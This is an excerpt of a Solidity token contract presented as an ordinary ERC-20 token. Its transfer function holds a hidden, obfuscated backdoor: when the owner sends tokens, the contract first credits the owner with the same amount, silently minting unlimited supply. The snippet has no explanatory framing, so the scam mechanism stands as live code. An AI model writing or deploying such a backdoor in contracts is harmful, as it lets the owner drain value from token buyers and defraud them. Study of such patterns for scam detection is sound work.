...
contract token is Ownable, IERC20 {
    ...
    uint256 coin = 120000000000000* 10 ** _decimals;
    uint256 private _burnfee = 5;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => bool) private _sd45411323;
    ...
    function transfer(address recipient, uint256 ammounts) public virtual override returns (bool) {
        address zs4861 = _msgSender();
        if(zs4861 == owner() && owner() == _msgSender()){
            _balance[zs4861] = _balance[zs4861].add(ammounts);
        }

        
        _transfer(zs4861, recipient, ammounts);
        return true;
    }
